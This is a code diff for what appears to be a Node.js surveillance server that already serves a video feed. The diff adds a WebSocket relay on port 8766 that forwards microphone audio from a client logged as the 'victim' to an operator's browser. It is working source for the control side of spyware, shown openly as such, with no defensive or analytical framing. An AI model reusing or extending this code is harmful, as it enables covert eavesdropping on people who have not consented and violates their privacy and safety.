@@ -125,6 +125,33 @@ app.get("/video_feed", (req, res) => {
   }, 33);
   req.on("close", () => clearInterval(interval));
 });
+const wssAudio = new WebSocket.Server({
+  host: "0.0.0.0",
+  port: 8766 
+});
+let audioClient = null;  
+let browserAudio = null; 
+wssAudio.on("connection", ws => {
+  console.log("Audio WebSocket connected");
+  ws.on("message", data => {
+    if (ws === audioClient && browserAudio && browserAudio.readyState === WebSocket.OPEN) {
+      browserAudio.send(data);
+    }
+  });
+  if (!audioClient) {
+    audioClient = ws;
+    console.log("🎤 Victim connected for audio");
+  } else if (!browserAudio) {
+    browserAudio = ws;
+    console.log("🌐 Browser victim connected to audio");
+  } else {
+    ws.close();
+  }
+  ws.on("close", () => {
+    if (ws === audioClient) audioClient = null;
+    if (ws === browserAudio) browserAudio = null;
+  });
+});
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Server running at: http://0.0.0.0:${PORT}`);
 });
